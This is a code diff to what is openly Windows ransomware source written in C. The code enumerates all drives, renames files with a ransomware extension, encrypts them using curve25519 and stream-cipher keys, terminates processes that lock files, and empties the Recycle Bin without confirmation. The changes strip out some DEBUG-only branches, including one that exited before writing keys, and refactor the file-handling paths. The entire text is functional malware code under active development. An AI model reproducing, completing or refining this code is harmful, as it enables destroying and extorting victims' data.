@@ -3,6 +3,7 @@
 #include <other/settings.h>
 #include <other/utility.h>
 #include "wsinternal.h"
+#include "util.h"
 #include "debug.h"
 #include "curve25519.h"
 #include "ecrypt-sync.h"
@@ -32,9 +33,6 @@ static const wchar_t* IGNORE_FILES[] = { L"ntldr", L"ntuser.dat.log",
 static const wchar_t* IGNORE_EXTENSIONS[] = { L".exe", L".dll",
     L".lnk", L".sys", L".msi", L".bat", RANSOMWARE_EXTENSION };
 
-#ifdef DEBUG
-static UINT64 g_encryptedSize = 0; /* Total size in bytes of encrypted files. */
-#endif
 static HANDLE g_hCompletionPort; /* Handle for the IO completion port. */
 static HCRYPTPROV g_hCryptProv; /* Handle for the crypto service provider. */
 static DWORD g_currentPID; /* Current PID. */
@@ -186,11 +184,6 @@ BOOL generateAndStoreKeys()
     sstrcpy(buffer, size, session.curve25519Private);
     ECRYPT_process_bytes(0, &ctx, buffer, buffer, size);
     
-#ifdef DEBUG
-    memset(&session, 0, sizeof(Session_t));
-    return TRUE;
-#endif
-    
     // Write the private key
     wchar_t* filePath = getDesktopPath();
     if (!filePath)
@@ -234,11 +227,9 @@ BOOL encryptDrives()
         return FALSE;
     }
     
-    SYSTEM_INFO sysInfo;
-    GetSystemInfo(&sysInfo);
-    DWORD processorsCount = sysInfo.dwNumberOfProcessors;
+    DWORD processorsCount = getSystemInfo().dwNumberOfProcessors;
     dbgmsg("%lu processors found\n", processorsCount);
-
+    
     // Create a handle for the IO completion port
     g_hCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, processorsCount);
     if (!g_hCompletionPort)
@@ -259,7 +250,7 @@ BOOL encryptDrives()
         
         encryptionThreads[i] = hEncryptionThread;
     }
-
+    
     DWORD enumeratedDrives = 0, drivesBitmask = GetLogicalDrives();
     if (!drivesBitmask)
         goto cleanup;
@@ -268,7 +259,7 @@ BOOL encryptDrives()
 #ifndef DEBUG
     SHEmptyRecycleBinW(NULL, NULL, SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND);
 #endif
-
+    
     // Create iterator threads
     DWORD i = 0;
     HANDLE iteratorThreads[MAX_ITERATOR_THREADS];
@@ -298,10 +289,6 @@ BOOL encryptDrives()
     WaitForMultipleObjects(processorsCount, encryptionThreads, TRUE, INFINITE);
     for (DWORD j = 0; j < processorsCount; j++)
         CloseHandle(encryptionThreads[j]);
-    
-#ifdef DEBUG
-    ndbgmsg("Total: %f GB\n", (float)g_encryptedSize / (1000 * 1000 * 1000));
-#endif
     
 cleanup:
     sfree(encryptionThreads);
@@ -385,9 +372,9 @@ cleanup:
 DWORD WINAPI encryptionThread(LPVOID lpParam)
 {
     UNREFERENCED_PARAMETER(lpParam);
-    static const DWORD DW_MILLISECONDS = 1000;
+    static const DWORD DW_MILLISECONDS = 1 * 1000;
     
-    wchar_t* filePath, * fileName, * newPath;
+    wchar_t* filePath, * fileName;
     while (TRUE)
     {
         DWORD bytesRead;
@@ -406,11 +393,11 @@ DWORD WINAPI encryptionThread(LPVOID lpParam)
             if (valueInArray(fileName, IGNORE_FILES, _countof(IGNORE_FILES)))
                 goto cleanup;
             
-            newPath = (wchar_t*)smalloc(MAX_PATH, sizeof(wchar_t));
+            wchar_t newPath[MAX_PATH];
 #ifndef DEBUG
             wsprintfW(newPath, L"%ls%ls", filePath, RANSOMWARE_EXTENSION);
             if (!MoveFileExW(filePath, newPath, MOVEFILE_WRITE_THROUGH | MOVEFILE_REPLACE_EXISTING))
-                goto ncleanup;
+                goto cleanup;
 #else
             lstrcpyW(newPath, filePath);
 #endif
@@ -419,23 +406,21 @@ DWORD WINAPI encryptionThread(LPVOID lpParam)
             if (hFile == INVALID_HANDLE_VALUE)
             {
                 if (GetLastError() != ERROR_SHARING_VIOLATION)
-                    goto ncleanup;
-
+                    goto cleanup;
+                
                 // Try to close the processes that are using the file
                 if (!terminateFileProcesses(newPath))
-                    goto ncleanup;
+                    goto cleanup;
                 
                 // Successfully closed all processes that were using the file, retry opening it
                 hFile = CreateFileW(newPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
                 if (hFile == INVALID_HANDLE_VALUE)
-                    goto ncleanup;
+                    goto cleanup;
             }
             
             encryptFile(hFile);
             CloseHandle(hFile);
-            
-        ncleanup:
-            sfree(newPath);
+
         cleanup:
             sfree(filePath);
         }
@@ -631,9 +616,7 @@ void encryptFile(HANDLE hFile)
     fileOffset.QuadPart = 0;
     SetFilePointerEx(hFile, fileOffset, 0, FILE_END);
     WriteFile(hFile, &mt, sizeof(FileMetadata_t), &dwWrite, 0);
-#else
-    g_encryptedSize += fileSize.QuadPart;
-#endif    
+#endif
     
 end:
     memset(&ctx, 0, sizeof(ECRYPT_ctx));
